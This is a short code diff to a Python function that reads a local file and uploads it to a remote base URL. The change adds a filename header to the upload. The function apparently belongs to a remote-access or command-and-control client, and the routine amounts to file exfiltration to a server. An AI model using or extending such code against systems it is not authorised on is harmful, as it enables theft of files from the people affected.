@@ -55,7 +55,10 @@ def get(command, session, base_url):
     if os.path.exists(path):
         with open(path, 'rb') as local_file:
             files = {'file': local_file}
-            session.post(base_url, files=files, headers={'Function': 'get_file'})
+            headers = {'Function': 'get_file',
+                       'Filename': f'{path.split("/")[-1]}'
+                       }
+            session.post(base_url, files=files, headers=headers)
     else:
         # TODO verify the necessity of add specific header for error send server side
         session.post(url=base_url, data='[X] File not found!')
